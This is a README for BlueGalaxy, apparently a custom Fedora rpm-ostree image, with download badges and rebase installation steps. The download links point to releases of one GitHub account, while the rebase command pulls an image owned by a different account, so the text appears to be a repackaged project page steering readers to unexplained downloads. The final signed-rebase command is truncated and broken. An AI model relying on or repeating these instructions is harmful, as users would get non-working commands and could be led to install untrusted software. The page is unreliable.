# 🌌 BlueGalaxy - Explore a Powerful Custom Image Solution

[![Download BlueGalaxy](https://img.shields.io/badge/Download-BlueGalaxy-blue)](https://github.com/dakshay227/BlueGalaxy/releases)

## 🚀 Getting Started

Welcome to BlueGalaxy! This guide will help you download and run the software with ease. 

### 📥 Download & Install

To get BlueGalaxy, follow these steps:

1. **Visit the Releases Page**  
   Click the link below to access the BlueGalaxy releases.  
   [Download BlueGalaxy](https://github.com/dakshay227/BlueGalaxy/releases)

### 💻 System Requirements

Before you install BlueGalaxy, ensure your system meets the following requirements:
- **Operating System:** A recent version of Fedora or any compatible Linux distribution.
- **Memory:** At least 2 GB of RAM.
- **Disk Space:** Minimum of 500 MB of available disk space.
- **Internet Connection:** Required for downloading and updating.

### ⚙️ Installation Steps

1. **Open your Terminal.**
2. **Rebase to the Unsigned Image**  
   Run the following command:  
   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/jvssdev/bluegalaxy:latest
   ```
3. **Reboot your System**  
   After the rebase, you need to reboot to complete the process:  
   ```bash
   systemctl reboot
   ```
4. **Rebase to the Signed Image**  
   After rebooting, run this command:  
   ```bash
   rpm-ostree rebase ostree-image-signed:docker://ghcr
   ```

### 📄 Features

BlueGalaxy offers several features to enhance your experience:
- **Custom Image Creation:** Build tailored images for your needs.
- **Atomic Updates:** Ensures your system stays up to date with minimal hassle.
- **Security:** Integrated signing policies to protect your installation.
  
### 📫 Support and Contributing

If you encounter issues or have questions, please contact support at [support@bluegalaxy.com](mailto:support@bluegalaxy.com). We welcome contributions! If you want to contribute to BlueGalaxy, check out our [Contributing Guide](https://github.com/dakshay227/BlueGalaxy/contributing).

### 🔗 Useful Links

- [Documentation](https://blue-build.org/how-to/setup/)
- [Issues Tracker](https://github.com/dakshay227/BlueGalaxy/issues)

### ⚠️ Warning

This is an experimental feature. Use it at your own discretion. For more information on the experimental features, see the [Fedora Project Article](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable).

Thank you for choosing BlueGalaxy! We hope you enjoy the experience.